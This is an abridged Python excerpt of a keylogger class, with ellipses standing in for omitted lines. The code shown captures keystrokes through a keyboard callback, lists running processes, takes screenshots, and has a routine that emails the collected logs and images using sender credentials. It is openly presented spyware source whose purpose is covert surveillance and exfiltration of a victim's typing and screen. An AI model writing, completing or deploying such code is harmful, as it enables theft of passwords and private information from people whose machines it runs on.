...
class Keylogger:
    def __init__(self, interval, report_method="email"):
        ...
        # keystrokes , process, screenshots log stored in this variables
        self.log = ""
        self.process = ""
        self.screenshots = []
    ...
    def report_to_mail(self, sender, password, receiver, subject, body, files):
        ...
        try:
            ...
            print('Email NOT sent to %s successfully. %s ERR: %s %s %s ', str(receiver), 'tete', str(
                sys.exc_info()[0]), str(sys.exc_info()[1]), str(sys.exc_info()[2]))

    def callback(self, event):
        # Trigger when keyboard event is occured
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
    ...
    def process_list(self):
        for proc in psutil.process_iter():
            try:
                ...
                self.process += f"{processID:<5} ::: {processName:<30} --> {processStatus}\n"
    ...
    def screenshot(self):
        ...
        print(f"[+] Saved {self.screenshot_filename}")
        self.screenshots.append(self.screenshot_filename)
        self.start_dt = datetime.now().strftime('%d-%m-%Y %I:%M:%S')
